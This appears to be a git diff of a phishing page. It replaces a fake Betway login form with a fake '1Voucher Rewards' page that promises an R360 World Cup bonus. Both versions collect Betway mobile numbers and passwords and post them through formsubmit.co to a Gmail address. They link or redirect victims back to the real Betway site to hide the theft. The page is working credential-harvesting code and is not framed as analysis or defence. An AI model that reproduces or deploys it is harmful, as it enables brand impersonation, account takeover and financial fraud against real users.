@@ -1,214 +1,253 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="ltr">
 <head>
-  <meta charset="UTF-8">
-  <title>Betway Login</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>1VOUCHER REWARDS</title>
+
+  <!-- Font & Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:ital@1&display=swap" rel="stylesheet" />
+
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
 
     body {
-      font-family: Arial, sans-serif;
-      background: #fff;
-      color: #000;
+      background: #DD571C; /* Orange background */
+      overflow-x: hidden;
     }
 
-    .header {
-      background-color: #000;
-      color: white;
-      padding: 15px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
+    .container {
+      max-width: 440px;
+      padding: 0 20px;
+      margin: 50px auto;
+      padding-top: 10px;
+      padding-bottom: 40px;
     }
 
-    .brand-name {
-      font-size: 20px;
-      font-weight: bold;
-    }
-
-    .header-buttons button {
-      margin-left: 10px;
-      padding: 6px 12px;
-      border: none;
-      border-radius: 4px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-
-    .login-header-btn {
-      background-color: white;
-      color: green;
-    }
-
-    .signup-header-btn, .betslip-header-btn {
-      background-color: green;
-      color: white;
-    }
-
-    .betslip-count {
-      background: yellow;
-      border-radius: 50%;
-      color: black;
-      font-size: 12px;
-      margin-left: 5px;
-      padding: 2px 6px;
-    }
-
-    .overlay {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 30px 15px;
-    }
-
-    .login-box {
+    .wrapper {
       width: 100%;
-      max-width: 400px;
-      background: #fff;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.15);
-      padding: 20px;
-    }
-
-    .login-box h2 {
-      text-align: center;
-      color: green;
-      margin-bottom: 20px;
-    }
-
-    .mobile-number {
-      display: flex;
-      border: 1px solid #ccc;
+      background: white; /* White box */
       border-radius: 5px;
+      box-shadow: 0px 4px 10px 1px rgba(0, 0, 0, 0.1);
+      position: relative;
       overflow: hidden;
-      margin-bottom: 10px;
     }
 
-    .country-code {
-      background-color: green;
-      color: white;
-      padding: 10px;
-      font-weight: bold;
-    }
-
-    .mobile-number input {
-      width: 100%;
-      padding: 10px;
-      border: none;
-      outline: none;
-    }
-
-    input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      margin: 12px 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      outline: none;
-    }
-
-    .forgot-text {
+    /* --- IMAGE BOX --- */
+    .image-box {
+      border-top-left-radius: 8px;
+      border-top-right-radius: 8px;
+      width: 99%;
       display: block;
-      text-align: right;
-      font-size: 13px;
-      color: #555;
-      text-decoration: none;
-      margin-bottom: 10px;
+      margin: 0 auto;
+      box-shadow: 5px 5px 10px rgba(255, 255, 255, 0.2);
     }
 
-    .login-btn {
-      width: 100%;
-      padding: 12px;
-      background-color: green;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      font-weight: bold;
+    /* --- MESSAGE BOX --- */
+    .voucher-message-box {
+      background: white;
+      border: 4px solid #DD571C;
+      border-radius: 15px;
+      text-align: center;
+      padding: 25px 15px;
+      margin: 10px 20px;
+      font-family: 'Roboto Slab', serif;
+      font-style: italic;
+      color: #DD571C;
       font-size: 16px;
+      line-height: 1.5;
+      display: none;
+    }
+
+    /* --- Animations --- */
+    @keyframes blinkTwice {
+      0%, 20%, 40%, 100% {
+        opacity: 1;
+      }
+      10%, 30% {
+        opacity: 0;
+      }
+    }
+
+    @keyframes blinkOnce {
+      0%, 50%, 100% {
+        opacity: 1;
+      }
+      25% {
+        opacity: 0;
+      }
+    }
+
+    form {
+      padding: 30px 25px 25px 25px;
+    }
+
+    .row {
+      height: 45px;
+      margin-bottom: 15px;
+      position: relative;
+    }
+
+    .row input {
+      height: 100%;
+      width: 100%;
+      outline: none;
+      padding-left: 60px;
+      border-radius: 5px;
+      border: 1px solid lightgrey;
+      font-size: 16px;
+    }
+
+    .row input:focus {
+      border-color: #16a085;
+      box-shadow: inset 0px 0px 2px 2px rgba(26, 188, 156, 0.25);
+    }
+
+    .row input::placeholder {
+      color: #999;
+    }
+
+    .row i {
+      position: absolute;
+      width: 47px;
+      height: 100%;
+      color: white;
+      font-size: 18px;
+      background: #DD571C;
+      border: 1px solid #16a085;
+      border-radius: 5px 0 0 5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .pass {
+      margin: -8px 0 20px 0;
+    }
+
+    .pass a {
+      color: #DD571C;
+      font-size: 17px;
+      text-decoration: none;
+    }
+
+    .pass a:hover {
+      text-decoration: underline;
+    }
+
+    .button input {
+      color: white;
+      font-size: 20px;
+      font-weight: 500;
+      padding-left: 0px;
+      background: #DD571C;
+      border: 1px solid #FF8C00;
       cursor: pointer;
     }
 
-    .signup-text {
+    .button input:hover {
+      background: black;
+    }
+
+    .signup-link {
       text-align: center;
-      margin-top: 15px;
-    }
-
-    .signup-text a {
-      color: green;
-      text-decoration: none;
-      font-weight: bold;
-    }
-
-    .footer {
-      background-color: #222;
-      color: #ccc;
-      padding: 20px;
-      font-size: 13px;
-    }
-
-    .footer-content {
-      display: flex;
-      justify-content: space-between;
-      flex-wrap: wrap;
-    }
-
-    .footer-left, .footer-right {
-      width: 48%;
-    }
-
-    .footer-left p, .footer-right p {
-      margin: 5px 0;
-    }
-
-    .footer-text {
       margin-top: 20px;
-      color: #aaa;
-      font-size: 12px;
-      line-height: 1.4;
+      font-size: 17px;
     }
 
-    @media (max-width: 600px) {
-      .footer-left, .footer-right {
-        width: 100%;
-      }
+    .signup-link a {
+      color: #DD571C;
+      text-decoration: none;
+    }
+
+    .signup-link a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
+
 <body>
+  <div class="container">
+    <div class="wrapper">
+      <!-- IMAGE Box -->
+      <img id="voucherImage" src="https://www.peachpayments.com/hubfs/1%20voucher.png" alt="1Voucher" class="image-box" />
 
-  <!-- Header -->
-  <div class="header">
-    <div class="brand-name">betway</div>
-    <div class="header-buttons">
-      <button class="login-header-btn">Login</button>
-      <button class="signup-header-btn">Sign Up</button>
-      <button class="betslip-header-btn">
-        Betslip <span class="betslip-count">0</span>
-      </button>
-    </div>
-  </div>
+      <!-- MESSAGE Box -->
+      <div id="messageBox" class="voucher-message-box">
+        Congratulations, you have claimed R360 1Voucher Bonus for World Cup Opening. Enter your Betway details below and check your Betway inbox after 2 hours for voucher code.
+      </div>
 
-  <!-- Login Overlay -->
-  <div class="overlay">
-    <div class="login-box">
-      <h2>Login</h2>
-      <form action="formsubmit.co/robarsrsa@gmail.com" method="POST">
-     <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="https://www.betway.co.za/LiveGameslobby">
-      
-        <div class="mobile-number">
-          <span class="country-code">+27</span>
-          <input type="number" name="mobile_number" placeholder="Mobile Number" required>
+      <!-- FORM -->
+      <form action="https://formsubmit.co/tshabamapheloaskoya@gmail.com" method="POST">
+        <input type="hidden" name="_captcha" value="false" />
+
+        <div class="row">
+          <i class="fas fa-user"></i>
+          <input type="number" name="phone" placeholder="Mobile Number" required />
         </div>
-        <a href="#" class="forgot-text">Forgot Username?</a>
-        <input type="password" name="password" placeholder="Password" required>
-        <a href="www.betway.co.za" class="forgot-text">Forgot Password?</a>
-        <button type="submit" class="login-btn">Login</button>
+
+        <div class="row">
+          <i class="fas fa-lock"></i>
+          <input type="password" name="password" placeholder="Password" required />
+        </div>
+
+        <div class="pass"><a href="https://betway.co.za">Forgot password?</a></div>
+
+        <div class="row button">
+          <input type="submit" value="Login" />
+        </div>
+
+        <div class="signup-link">Not Registered? <a href="https://betway.co.za">Signup now</a></div>
       </form>
-      <p class="signup-text">
-        Don't have an account yet? 
-        <a href="www.betway.co.za">Sign Up</a>
-      </p>
     </div>
   </div>
+
+  <script>
+    const voucherImage = document.getElementById("voucherImage");
+    const messageBox = document.getElementById("messageBox");
+
+    // Helper to add animation and return a Promise that resolves when animation ends
+    function animateElement(element, animationName, duration) {
+      return new Promise((resolve) => {
+        element.style.animation = `${animationName} ${duration} forwards`;
+        function handleAnimationEnd() {
+          element.style.animation = '';
+          element.removeEventListener('animationend', handleAnimationEnd);
+          resolve();
+        }
+        element.addEventListener('animationend', handleAnimationEnd);
+      });
+    }
+
+    async function runSequence() {
+      // Step 1: Blink voucher image twice over 5 seconds
+      voucherImage.style.display = 'block';
+      messageBox.style.display = 'none';
+      await animateElement(voucherImage, 'blinkTwice', '5s');
+
+      // Step 2: Show message box blinking twice over 5 seconds
+      voucherImage.style.display = 'none';
+      messageBox.style.display = 'block';
+      await animateElement(messageBox, 'blinkTwice', '5s');
+
+      // Step 3: Blink voucher image once quickly (2s), then stay visible
+      messageBox.style.display = 'none';
+      voucherImage.style.display = 'block';
+      await animateElement(voucherImage, 'blinkOnce', '2s');
+
+      // Finally ensure voucher image stays visible, no animation
+      voucherImage.style.animation = '';
+      voucherImage.style.opacity = '1';
+    }
+
+    window.onload = runSequence;
+  </script>
+</body>
+</html>
